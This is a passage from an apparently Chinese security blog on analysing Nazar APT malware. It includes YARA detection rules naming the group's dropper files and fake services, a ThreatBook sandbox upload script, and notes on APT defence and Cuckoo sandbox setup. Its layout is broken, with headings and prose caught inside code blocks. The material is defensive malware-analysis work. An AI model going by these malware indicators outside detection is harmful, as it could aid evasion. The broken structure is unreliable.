语言相同的词法约定，它们可以包含任何字母数字和下划线，但第一个字符不能是数字。</p>\n<p>规则标识符区分大小写，并且不能超过 128 个字符。以下关键字是保留的，不能用作标识：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rule apt_ZZ_SIG37_NAZAR_GpUpdatesExe</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tmeta:</span><br><span class=\"line\">\t\tdesc = &quot;SIG37 GpUpdates dropper, Chilkat Zip2Secure&quot;</span><br><span class=\"line\">\t\tauthor = &quot;JAG-S&quot;</span><br><span class=\"line\">\t\thash = &quot;75e4d73252c753cd8e177820eb261cd72fecd7360cc8ec3feeab7bd129c01ff6&quot;</span><br><span class=\"line\">\tstrings:</span><br><span class=\"line\">\t\t$open = &quot;open&quot; ascii wide fullword</span><br><span class=\"line\">\t\t$regsrv = &quot;regsvr32.exe&quot; ascii wide</span><br><span class=\"line\">\t\t$filename1 = &quot;Godown.dll -s&quot; ascii wide</span><br><span class=\"line\">\t\t$filename2 = &quot;ViewScreen.dll -s&quot; ascii wide</span><br><span class=\"line\">\t\t$filename3 = &quot;Filesystem.dll -s&quot; ascii wide</span><br><span class=\"line\"></span><br><span class=\"line\">\tcondition:</span><br><span class=\"line\">\t\tuint16(0) == 0x5a4d</span><br><span class=\"line\">\t\tand</span><br><span class=\"line\">\t\t($open and $regsrv and (1 of ($filename*))) </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"云沙盘api使用方法\"><a class=\"markdownIt-Anchor\" href=\"#云沙盘api使用方法\">#</a> 云沙盘 API 使用方法</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94LnRocmVhdGJvb2suY29tL3Y1L2FwaURvY3M=\">API 文档 (threatbook.com)</span></p>\n<ol>\n<li>\n<p>apikey 是 stringAPI 请求的身份识别标识。2resource 是 stringIP 地址，目前支持单个查询。3exclude 可选 string 可根据实际使用场景排除以下参数，返回结果信息，多个参数请以逗号分隔（注意不要有空格）。</p>\n</li>\n<li>\n<p>asn：asn 信息。</p>\n</li>\n<li>\n<p>ports：端口信息。</p>\n</li>\n<li>\n<p>cas：SSL 证书等信息。</p>\n</li>\n<li>\n<p>rdns_list：rdns 记录信息。</p>\n</li>\n<li>\n<p>intelligences：威胁情报。</p>\n</li>\n<li>\n<p>judgments：从威胁情报中分析，综合判定的威胁类型。</p>\n</li>\n<li>\n<p>tags_classes：相关攻击团伙或安全事件信息标签等。</p>\n</li>\n<li>\n<p>samples：相关样本。</p>\n</li>\n<li>\n<p>update_time：情报最近更新时间。</p>\n</li>\n<li>\n<p>sum_cur_domains：当前指向域名的数量。</p>\n</li>\n<li>\n<p>scene：应用场景。</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import requests</span><br><span class=\"line\">url = &#x27;https://api.threatbook.cn/v3/file/upload&#x27;;</span><br><span class=\"line\">fields = &#123;</span><br><span class=\"line\">    &#x27;apikey&#x27;: &#x27;请替换apikey&#x27;,</span><br><span class=\"line\">    &#x27;sandbox_type&#x27;: &#x27;win7_sp1_enx86_office2013&#x27;,</span><br><span class=\"line\">    &#x27;run_time&#x27;: 60</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">file_dir = &#x27;请替换文件地址&#x27;</span><br><span class=\"line\">file_name = &#x27;myfile.exe&#x27;</span><br><span class=\"line\">files = &#123;</span><br><span class=\"line\">  &#x27;file&#x27; : (file_name, open(os.path.join(file_dir, file_name), &#x27;rb&#x27;))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">response = requests.post(url, data=fields, files=files)</span><br><span class=\"line\">print(response.json())</span><br></pre></td></tr></table></figure>\n<h2 id=\"apt攻击链恶意样本分析\"><a class=\"markdownIt-Anchor\" href=\"#apt攻击链恶意样本分析\">#</a> APT 攻击链恶意样本分析</h2>\n<p>APT（AdvancedPersistent Threat）高级持续性威胁。是指组织 (特别是政府) 或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。APT 是黑客以窃取核心资料为目的，针对客户所发动的网络攻击和侵袭行为。</p>\n<p>替换服务 svchost.exe 替换</p>\n<p>APT 的攻击手法，在于隐匿自己，针对特定对象，长期、有计划性和组织性地窃取数据，此类攻击行为是传统安全检测系统无法有效检测发现，前沿防御方法是利用非商业化虚拟机分析技术，对各种邮件附件、文件进行深度的动态行为分析，发现利用系统漏洞等高级技术专门构造的恶意文件，从而发现和确认 APT 攻击行为。由于 APT 的特性，导致难发现、潜在威胁大，一旦被攻击将导致企业、政府、医疗组织等等的大量数据被窃取，公司重要财务、机密被盗窃。</p>\n<ul>\n<li>Nazar APT 组织分析</li>\n</ul>\n<p>三年前左右，在 2017 年 4 月 14 日，一个神秘的黑客组织影子经纪人（Shadow Brokers）在互联网上公布了一系列的黑客工具和漏洞，这些曾经被 NSA 利用的工具 / 漏洞一定程度上给互联网带来了大地震。</p>\n<p>这批泄露中涵盖多种黑客工具和不同的漏洞，例如 Windows 的 “永恒之蓝” 漏洞，就是造成 WannaCry 以及后来 NotPetya 勒索软件席卷全球的最大元凶。除此之外，研究人员还发现了更多未知内容，尝试解读出其中隐藏的各种秘密。</p>\n<h3 id=\"关于sigspy文件\"><a class=\"markdownIt-Anchor\" href=\"#关于sigspy文件\">#</a> 关于 Sigs.py 文件</h3>\n<p>自从 3 年前影子经纪人泄露这批黑客工具以来，全球各地的安全研究人员就在积极研究，尽管可能出于不同目的，但总是想从中挖出点有用的信息来，整出一些大新闻。除了声名远播的 “永恒之蓝” 漏洞，其中还有一个名为 sigs.py 的文件，让很多研究人员大为痴迷。</p>\n<p>Sigs.py 这个文件据说是作为一个精简版的恶意软件扫描器，被 NSA 部署在目标系统中，通过扫描目标系统是否存在一些行为特征，从而判断目标系统中是否还有其他 APT 存在。</p>\n<p>这个文件中包含 44 个特征指纹（Signatures）用来检测其他 APT 组织的行为，编号为 1-45 号，其中不包括第 42 号。如果研究人员的推测是正确的，那么这个文件就表明 NSA 掌握至少 44 个 APT 组织的恶意行为特征，这远超目前公开的 APT 数量。</p>\n<h3 id=\"nazar-样本分析\"><a class=\"markdownIt-Anchor\" href=\"#nazar-样本分析\">#</a> Nazar 样本分析</h3>\n<ul>\n<li>Nazar APT 样本分析之一</li>\n</ul>\n<ol>\n<li>\n<pre><code>rule apt_ZZ_SIG37_NAZAR_GpUpdatesExe\n&#123;\n\tmeta:\n\t\tdesc = &quot;SIG37 GpUpdates dropper, Chilkat Zip2Secure&quot;\n\t\tauthor = &quot;JAG-S&quot;\n\t\thash = &quot;75e4d73252c753cd8e177820eb261cd72fecd7360cc8ec3feeab7bd129c01ff6&quot;\n\tstrings:\n\t\t$open = &quot;open&quot; ascii wide fullword\n\t\t$regsrv = &quot;regsvr32.exe&quot; ascii wide\n\t\t$filename1 = &quot;Godown.dll -s&quot; ascii wide\n\t\t$filename2 = &quot;ViewScreen.dll -s&quot; ascii wide\n\t\t$filename3 = &quot;Filesystem.dll -s&quot; ascii wide\n\n\tcondition:\n\t\tuint16(0) == 0x5a4d\n\t\tand\n\t\t($open and $regsrv and (1 of ($filename*))) \n&#125;\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">   </span><br><span class=\"line\"></span><br><span class=\"line\">   Nazar APT样本分析之二</span><br><span class=\"line\"></span><br><span class=\"line\">2. ```</span><br><span class=\"line\">   rule apt_ZZ_SIG37_NAZAR_GoDownDll</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">   \tmeta:</span><br><span class=\"line\">   \t\tdesc = &quot;SIG37 Dropped TypeLibrary&quot;</span><br><span class=\"line\">   \t\tauthor = &quot;JAG-S&quot;\t\t</span><br><span class=\"line\">   \t\thash = &quot;8fb9a22b20a338d90c7ceb9424d079a61ca7ccb7f78ffb7d74d2f403ae9fbeec&quot; //??</span><br><span class=\"line\">   \tstrings:</span><br><span class=\"line\">   \t\t$godown1 = /Godown [0-9.]&#123;1,4&#125; Type LibraryWWW/ ascii wide</span><br><span class=\"line\">   \t\t$godown2 = &quot;Godown.Shutdown.1&quot; ascii wide</span><br><span class=\"line\">   \t\t$godown3 = &quot;qGODOWNLibWWW&quot; ascii wide</span><br><span class=\"line\">   </span><br><span class=\"line\">   \t\t$guid1 = &quot;&#123;772BA12D-8A62-4DD3-B3E8-92DA702E6F3D&#125;&quot; ascii wide //TypeLib reg</span><br><span class=\"line\">   \t\t$guid2 = &quot;&#123;B64E94AF-D56B-48B4-B178-AF0723E72AB5&#125;&quot; ascii wide //TypeLib reg</span><br><span class=\"line\">   \t\t$guid3 = &quot;&#123;DBCB4B31-21B8-4A0F-BC69-0C3CE3B66D00&#125;&quot; ascii wide</span><br><span class=\"line\">   </span><br><span class=\"line\">   \t\t$shutdown1 = &quot;aShutdownd&quot; ascii wide</span><br><span class=\"line\">   \t\t$shutdown2 = &quot;IShutdownWWWd&quot; ascii wide</span><br><span class=\"line\">   \t\t$shutdown3 = &quot;IShutdown InterfaceWWW&quot; ascii wide</span><br><span class=\"line\">   \t\t$shutdown4 = &quot;method PowerOffWWW&quot; ascii wide\t\t</span><br><span class=\"line\">   \t\t$shutdown5 = &quot;property TimeoutWW&quot; ascii wide</span><br><span class=\"line\">   </span><br><span class=\"line\">   \tcondition:</span><br><span class=\"line\">   \t\tuint16(0) == 0x5a4d</span><br><span class=\"line\">   \t\tand</span><br><span class=\"line\">   \t\t(</span><br><span class=\"line\">   \t\t\tany of ($godown*)</span><br><span class=\"line\">   \t\t\tor</span><br><span class=\"line\">   \t\t\tany of ($guid*)</span><br><span class=\"line\">   \t\t\tor</span><br><span class=\"line\">   \t\t\t2 of ($shutdown*)</span><br><span class=\"line\">   \t\t)</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n\n\n \n\n</code></pre>\n</li>\n</ol>\n<ul>\n<li>Nazar APT 样本分析之三</li>\n</ul>\n<ol>\n<li>\n<pre><code>rule apt_ZZ_SIG37_NAZAR_Kzher_pdb\n&#123;\n\tmeta:\n\t\tdesc = &quot;GoDown PDB Path&quot;\n\t\tauthor = &quot;JAG-S&quot;\t\t\n\t\thash = &quot;4d0ab3951df93589a874192569cac88f7107f595600e274f52e2b75f68593bca&quot;\n\t\thash = &quot;d9801b4da1dbc5264e83029abb93e800d3c9971c650ecc2df5f85bcc10c7bd61&quot;\n\t\thash = &quot;1110c3e34b6bbaadc5082fabbdd69f492f3b1480724b879a3df0035ff487fd6f&quot;\n\tstrings:\n\t\t$pdb_spec = &quot;C:\\\\khzer\\\\DLLs\\\\DLL's Source\\\\&quot; ascii wide\n\t\t$pdb_gen = &quot;C:\\\\khzer\\\\&quot; ascii wide\n\n\tcondition:\n\t\tuint16(0) == 0x5a4d\n\t\tand\n\t\tany of them\n&#125;\n\n\nrule apt_ZZ_SIG37_NAZAR_GpUpdates_Distribute\n&#123;\n\tmeta:\n\t\tdesc = &quot;SIG37 GpUpdates unpacked distributor: Distribute.exe&quot;\n\t\tauthor = &quot;JAG-S&quot;\n\t\thash = &quot;6b8ea9a156d495ec089710710ce3f4b1e19251c1d0e5b2c21bbeeab05e7b331f&quot;\n\t\tparent = &quot;d34a996826ea5a028f5b4713c797247913f036ca0063cc4c18d8b04736fa0b65&quot;\n\tstrings:\n\t\t$uniq_filename1 = &quot;\\\\godown.dll&quot; ascii wide\n\t\t\n\t\t\n\t\t$common_filename1 = &quot;\\\\ViewScreen.dll&quot; ascii wide\n\t\t$common_filename2 = &quot;\\\\filesystem.dll&quot; ascii wide\n\t\t$common_filename3 = &quot;\\\\dllcache\\\\svchost.exe&quot; ascii wide\n\t\t$common_filename4 = &quot;\\\\lame_enc.dll&quot; ascii wide\n\t\t$common_filename5 = &quot;\\\\hodll.dll&quot; ascii wide\n\n\t\t$service1 = &quot;Provides basic host functionality&quot; ascii wide\n\t\t$service2 = &quot;EYService&quot; ascii wide\n\t\t$service3 = &quot;Windows Host Service&quot; ascii wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d\n\t\tand\n\t\t(\n\t\t\tany of ($uniq_filename*)\n\t\t\tor\n\t\t\tall of ($common_filename*)\n\t\t\tor\n\t\t\t(all of ($service*) and 3 of ($common_filename*))\n\t\t)\n&#125;\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">### APT攻击检测与防御</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</code></pre>\n</li>\n</ol>\n<p>1、 URL 异常检测，深度分析 URL 内 User-Agent 字段以及 HTTP 状态码来判断网站是否异常，以及网站中是否有恶意文件的下载链接，<br>\n{host,user-agent}<br>\n 2. Email 异常检测，通过对邮件的包头，发件人和邮件内附件或者链接检查，分析是否有恶意软件或链接存在。<br>\n2、沙箱检测技术，模拟 Linux、Windows，Android 环境，将可以文件放在沙箱离模拟运行，通过自动观测、自动分析、自动警告发现未知威胁。沙箱同时又叫做沙盘，是一种 APT 攻击 核心防御技术，该技术在应用时能够创造一种 模拟化的环境来隔离本地系统中的注册表、内存以及对象，而实施系统访问、文件观察等可以通过虚拟环境来实施操作，同时沙箱能够利用定向技术在特定文件夹当中定向进行文件的 修改和生成，防止出现修改核心数据和真实注册表的现象，一旦系统受到 APT 攻击，实现的虚拟环境能够对特征码实施观察和分析，从而将攻击进行有效的防御。在实际应用过程中， 沙箱技术能够充分发挥防御作用，但是由于其消耗本地资料过多，导致工作处理过程周期过长，对此要进一步加强其应用效率的提升，从而有效区分和处理软件与文件，有效提升自身的应用效率，充分防御来自于外界的 APT 攻击。<br>\n3、信誉技术，安全信誉主要是评估互联网资源和有关服务主体在安全性能方面的指数和表现，而信誉技术在应用过程中能够以一种辅助的方式来检测 APT 攻击，并针对性建设信誉数据库，其中包括威胁情报库、僵尸网络地址库、文件 MD5 码库以及 WEB URL 信誉库，能够作为辅助支撑技术帮助系统提升检测 APT 攻击， 比如常见的木马病毒和新型病毒等，一旦遇到不良信誉资源能够利用网络安全设备进行过滤和阻断。在此过程中，信誉库能够充分发挥自 身优势，有效保护系统相关数据和信息，提升 安全产品的安全防护指数，依照实际情况来分析，信誉技术已经广泛应用到网络类安全产品当中，并且通过安全信誉评估策略服务和信誉过滤器等功能为信息系统的安全提供有效保 障。<br>\n4、异常流量分析技术，异常流量分析技术在应用过程中主要以一种流量检测方式和分析方式对有关流量信息实施提取，并且针对其中的带宽占用、CPU/ RAM、物理路径、IP 路由、标志位、端口、 协议、帧长、帧数等实施有效的监视和检测，并且融入节点、拓扑和时间等分析手段来统计 流量异常、流量行为等可能出现的异常信息， 从而依照分析的结果和数据来对可能出现的 0 DAY 漏洞攻击进行准确识别。同时，异常流量分析技术进一步融入了机器学习技术和统计学技术，能够以科学化、合理化的方式来对模型实施建立。与传统的网络防御技术相比，异常流量分析技术能够充分发挥自身优势，以一 种数据采集机制来保护原有系统，并且对出现的异常行为进行有效的追踪，分析历史流量数据，从而有效确定异常流量点，最终起到防御 APT 攻击的目的。<br>\n5、大数据分析技术在防御 APT 攻击时，要充分发挥大数据分析技术的优势，针对网络系统中出现的日志 数据和 SOC 安全管理平台中出现的日志数据， 利用大数据分析技术能够实施有效的分析和研 究，并通过态势分析、数据挖掘、数据统计技术，对大量历史数据进行分析，获取其中存在的 APT 攻击痕迹，从而以一种弥补方式来对 传统安全防御技术实施加强。同时，大数据分析技术要想发挥自身作用，需要提升自身数据分析和数据采集能力，并积极融合全自动相应系统，从而快速监控不同区域中的数据信息， 改变出现的信息孤岛所导致的调查分析问题。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">### 配置Buster Sandbox自动化沙盘检测方式</span><br><span class=\"line\"></span><br><span class=\"line\">1. 1.win XP虚拟机一台（win 7也可）</span><br><span class=\"line\"></span><br><span class=\"line\">   2.sandboxie 沙盒计算机程序</span><br><span class=\"line\"></span><br><span class=\"line\">   Sandboxie是一个沙盒计算机程序，由Ronen Tzur开发，可以在32位及64位的、基于Windows NT的系统上运行（如Windows XP、Windows 7等）。Sandboxie会在系统中虚拟出一块与系统完全隔离的空间，称之为沙箱环境，在这个沙盘环境内，运行的一切程序都不会对原操作系统产生影响。Sandboxie的本意是提供安全的Web浏览以及增强隐私，但是它的许多特性使用得它非常适合进行恶意软件分析。</span><br><span class=\"line\"></span><br><span class=\"line\">   3.BSA（Buster Sandbox Analysis）</span><br><span class=\"line\"></span><br><span class=\"line\">   BSA是一款监控沙箱内进程行为的工具。通过分析程序行为对系统环境造成的影响，确定程序是否为恶意软件。通过对BSA和Sandboxie的配置，可以监控程序对文件系统、注册表、端口甚至API调用序列等的操作。</span><br><span class=\"line\"></span><br><span class=\"line\">   4.winpcap</span><br><span class=\"line\"></span><br><span class=\"line\">   Winpcap(windows packet capture)是Windows平台下一个免费、公共的网络访问系统，它为win32应用程序提供访问网络底层的能力，Winpcap不阻塞、过滤或控制其他应用程序数据报的发收，它仅仅只是监听共享网络上传送的数据报。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">### APT分析-在线云沙盘分析系统</span><br><span class=\"line\"></span><br><span class=\"line\">1. 火眼（https://fireeye.ijinshan.com）</span><br><span class=\"line\"></span><br><span class=\"line\">   ​    火眼是国内的一个在线文件分析站点，由金山公司开发。在这里，你可以提交自己的文件进行分析，目前支持30MB以下的APK,EXE,DLL,BAT,HTML,JS,VBS,MSI和特定格式的压缩包。对于新提交的文件，会首先获取文件的MD5，sha-1签名，与已检测的文件数据库中的数据进行对比，如果已经存在，则会提示选择是重新分析还是查看最近一次分析结果。 另外，还可以查看已存在的其它文件的分析报告。 报告中的信息包括文件的基本信息（文件名，大小，类型，时间，MD5，SHA-1），点评，危险行为，其它行为（文件操作，注册表操作，进程操作，网络访问，还有运行截图）。</span><br><span class=\"line\"></span><br><span class=\"line\">   ​     这貌似是国内唯一的一个对外公开的在线沙盒，最重要的是免费。只要回答注册然后回答几个问题就可以使用。而且还是中文的看着舒服。而且还有关键行为的时间轴报告，看起来比较简单明了。总体来说，就是简单方便，但是专业性可能略显不足。 如果再说一个优点的话，就是不用翻墙</span><br><span class=\"line\"></span><br><span class=\"line\">   ​     再来介绍几个国外的。</span><br><span class=\"line\"></span><br><span class=\"line\">   2 VIRUSTOTAL(www.virustotal.com)</span><br><span class=\"line\"></span><br><span class=\"line\">   ​    VirusTotal是一个免费的病毒，蠕虫，木马和各种恶意软件分析服务。可以针对可疑文件和网址进行快速检测。 最大文件大小为64M。文件上传后会先计算哈希值，与已检测的文件数据库中的数据进行对比，如果已经存在，则会提示选择是重新分析还是查看最近一次分析结果。 分析报告中，包括病毒检出率（51个杀毒引擎查杀）文件详细信息（文件头，字符串，环境变量，运行时库），文件操作，网络操作（HTTP,DNS,TCP,UDP)，进程操作，互斥体，HOOK，窗口操作.</span><br><span class=\"line\"></span><br><span class=\"line\">   ​     不得不承认，VirusTotal做的比国内的火眼专业很多，各种信息记录的更加详尽，不仅记录了各种操作，并且记载了他们的执行是否成功，并且对各种信息进行了更加细致的分类。你几乎可以找到所有你想要找的除了源代码之外的文件信息和行为记录。而且速度在国外网站中算是比较快的了，不过还是需要用VPN。再有就是只能上传自己的文件，或者根据MD5，URL,IP等信息来查询报告，而没有一个索引来查看所有报告。这个其实也算不上缺点，只能说是小小的不足。总归瑕不掩瑜，这个网站绝对称得上专业两个字。</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">   3 ThreatExpert（http://www.threatexpert.com）</span><br><span class=\"line\"></span><br><span class=\"line\">   ​     ThreatExpert is an advanced automated threat analysis system designed to analyze and report the behavior of computer viruses, worms, trojans, adware, spyware, and other security-related risks in a fully automated mode.In only a few minutes ThreatExpert can process a sample and generate a highly detailed threat report with the level of technical detail that matches or exceeds antivirus industry standards such as those normally found in online virus encyclopedias.</span><br><span class=\"line\"></span><br><span class=\"line\">   4 Anubis（http://anubis.iseclab.org）</span><br><span class=\"line\"></span><br><span class=\"line\">   ​     Anubis（阿努比斯）也是一个恶意软件分析的服务器，可以提交URL和文件进行分析，分析报告可以选择HTML,XML,PDF,TXT,PDF五种格式，报告中包含了测试文件及其释放文件的文件操作，网络操作，注册表操作等信息。并且对这些操作进行了细分。</span><br><span class=\"line\"></span><br><span class=\"line\">   5 joe（http://www.joesecurity.org）</span><br><span class=\"line\"></span><br><span class=\"line\">   ​     这个貌似没有找到提交文件的地方，但是上面有一些已经存在的报告。报告的信息特别全。与之对应的，打开的速度就稍微慢了一些。但是内容真的是特别的多，只有你想不到，没有你找不到。不过看着最新的一个样本是两个月之前的。而且貌似是两个月左右更新一次。作为学习之用应该是非常不错的。</span><br><span class=\"line\"></span><br><span class=\"line\">   ### APT分析-开源沙箱分析系统</span><br><span class=\"line\"></span><br><span class=\"line\">   在工作中很多时候需要自己对一些可以程序，可执行文件进行检测，当然我们可以通过VT，微步，等一些开源的平台进行检测。现在我们通过自己搭建的开源的沙箱进行检测。所谓沙箱，是分离运行程序的一种安全机制。他通常用于执行未经测试的代码，或来自第三方、供应商、不可信网站等的不可信程序。我们可以通过沙箱在一个隔离的环境运行，不可信程序，并且获取他做的信息。</span><br><span class=\"line\"></span><br><span class=\"line\">   恶意软件分析一般分为两种:静态分析和动态分析。沙箱是动态分析的应用，它不静态分析二进制文件，实时执行并且监控恶意软件。这可以帮助安全分析人员获取不可信软件的细节，比如网络行为等，静态和动态分析不可信程序。生成的结果可以更快帮助我们对恶意软件进行分析。</span><br><span class=\"line\"></span><br><span class=\"line\">   1.2 关于Cuckoo</span><br><span class=\"line\"></span><br><span class=\"line\">   Cuckoo是一个开源的自动恶意软件分析系统,我们可以用它来自动运行和分析文件，并可以获取到全面的分析结果，</span><br><span class=\"line\"></span><br><span class=\"line\">   Cuckoo 可以获取以下类型结果:</span><br><span class=\"line\"></span><br><span class=\"line\">   1.追踪由恶意软件产生的所有进程执行的调用</span><br><span class=\"line\"></span><br><span class=\"line\">   2.恶意软件在执行中增删改查情况</span><br><span class=\"line\"></span><br><span class=\"line\">   3.恶意软件进程的内存输出</span><br><span class=\"line\"></span><br><span class=\"line\">   4.PCAP包格式的网络流量跟踪</span><br><span class=\"line\"></span><br><span class=\"line\">   5.在执行软件关键截图</span><br><span class=\"line\"></span><br><span class=\"line\">   6.机器全部内存输出 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1.3 Cuckoo模块和可分析样本类型:</span><br><span class=\"line\">  • Generic Windows executables</span><br><span class=\"line\">  • DLL files</span><br><span class=\"line\">  • PDF documents</span><br><span class=\"line\">  • Microsoft Office documents</span><br><span class=\"line\">  • URLs and HTML files</span><br><span class=\"line\">  • PHP scripts</span><br><span class=\"line\">  • CPL files</span><br><span class=\"line\">  • Visual Basic (VB) scripts</span><br><span class=\"line\">  • ZIP files</span><br><span class=\"line\">  • Java JAR</span><br><span class=\"line\">  • Python files</span><br><span class=\"line\">  • Almost anything else</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JsYWNrdG9wL2RvY2tlci1jdWNrb28=\">https://github.com/blacktop/docker-cuckoo</span><br>\ncd docker-cuckoo<br>\ndocker-compose up -d<br>\nFor docker-machine<br>\ncurl $(docker-machine ip):8000/cuckoo/status<br>\nFor Docker for Mac<br>\ncurl localhost:8000/cuckoo/status</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">### APT-Safebits 恶意样本之调试方法</span><br><span class=\"line\"></span><br><span 